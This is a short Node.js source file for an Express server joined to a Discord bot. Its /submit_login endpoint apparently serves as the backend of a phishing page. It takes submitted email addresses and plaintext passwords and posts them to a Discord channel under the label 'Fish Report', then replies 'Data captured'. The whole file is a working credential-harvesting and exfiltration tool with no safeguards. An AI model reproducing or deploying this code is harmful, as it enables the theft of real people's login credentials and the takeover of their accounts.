const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
const express = require("express");
const app = express();
const port = 3000;

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
});

client.once("ready", () => {
  console.log("Bot is online!");
});

app.use(express.json());

app.post("/submit_login", (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();
  const fullPassword = password;

  const embed = new EmbedBuilder()
    .setTitle("📊 Fish Report")
    .setColor(0x3498db)
    .setDescription("New form submission in your Fish catch simulation")
    .addFields(
      { name: "Timestamp", value: timestamp },
      { name: "Email Address", value: email },
      { name: "Password", value: fullPassword },
    )
    .setFooter({ text: "Fish Simulation" });

  const channelId = process.env.DISCORD_CHANNEL_ID;
  const channel = client.channels.cache.get(channelId);
  if (channel) {
    channel.send({ embeds: [embed] });
  }

  res.status(200).json({
    message: "Data captured and Discord notification sent successfully",
  });
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

client.login(process.env.DISCORD_BOT_TOKEN);
